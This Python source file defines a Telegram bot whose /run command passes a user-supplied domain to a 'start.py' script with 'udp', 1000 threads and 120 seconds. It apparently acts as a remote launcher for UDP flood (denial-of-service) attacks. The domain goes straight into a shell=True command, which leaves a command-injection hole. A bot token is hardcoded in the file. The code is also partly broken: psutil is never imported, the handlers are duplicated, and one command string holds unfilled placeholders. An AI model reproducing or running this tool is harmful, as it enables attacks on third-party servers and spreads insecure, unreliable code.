import telebot
import subprocess

# Replace 'YOUR_API_KEY' with your actual bot token
API_TOKEN = '7129718094:AAGAX62hkUEwAhbS9O3vm9HJmAOSwap6kQY'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the UDP Bot! Use the command /run to start.")

@bot.message_handler(commands=['run'])
def handle_run(message):
    msg = bot.reply_to(message, "Please provide the domain.")
    bot.register_next_step_handler(msg, process_domain)

def process_domain(message):
    try:
        domain = message.text
        udp = 'udp'
        thread = '1000'
        time = '120'

        # Command to be executed
        command = f"python start.py {udp} {domain} {thread} {time}"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()

        if process.returncode == 0:
            bot.reply_to(message, f"Command executed successfully:\n{output.decode('utf-8')}")
        else:
            bot.reply_to(message, f"Error executing command:\n{error.decode('utf-8')}")

    except Exception as e:
        bot.reply_to(message, f"Error processing domain: {str(e)}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Use the command /stop followed by the script name to stop a Python program.")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    msg = bot.reply_to(message, "start.py")
    bot.register_next_step_handler(msg, stop_script)

def stop_script(message):
    script_name = message.text.strip()
    stopped = stop_python_program(script_name)
    if stopped:
        bot.reply_to(message, f"Script '{script_name}' has been stopped.")
    else:
        bot.reply_to(message, f"Could not find or stop script '{script_name}'.")

def stop_python_program(script_name):
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            # Check if process is a Python process and matches the script name
            if proc.info['name'] == 'python' or proc.info['name'] == 'python3':
                if len(proc.info['cmdline']) > 1 and script_name in proc.info['cmdline'][1]:
                    proc.terminate()
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return False

@bot.message_handler(commands=['run'])
def handle_run(message):
    try:
        # Command to be executed
        command = "python start.py {udp} '{domain}' {thread} {time}"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()

        if process.returncode == 0:
            bot.reply_to(message, "Running")
        else:
            bot.reply_to(message, f"Error executing command:\n{error.decode('utf-8')}")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")
        

bot.polling()
